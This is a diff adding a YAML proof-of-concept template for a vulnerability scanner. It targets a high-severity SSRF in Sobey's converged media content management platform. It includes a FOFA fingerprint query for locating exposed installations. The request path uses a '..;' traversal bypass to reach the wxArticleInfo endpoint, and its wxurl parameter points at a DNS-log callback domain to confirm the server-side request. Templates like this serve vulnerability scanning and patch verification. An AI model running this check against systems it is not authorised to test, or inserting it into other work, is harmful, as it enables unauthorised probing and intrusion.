@@ -1,0 +1,18 @@
+id: poc-yaml-sobey-imcmp-wxarticleinfo-ssrf
+info:
+  name: 索贝融合媒体内容管理平台 wxArticleInfo SSRF漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  finger: 索贝融合媒体内容管理平台
+  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /sobey-mchEditor/js/..;/mch/WXArticleInt/wxArticleInfo?siteCode=&token=&wxurl=https://{{.domain}}/xxe_test
+  expression: status_code == 200 && contains(body,"\"data\":null") && contains(body,"\"message\":\"解析公众号文章失败\"")
+    && !contains(body,"<") && reverse.Verify()
+transport: http
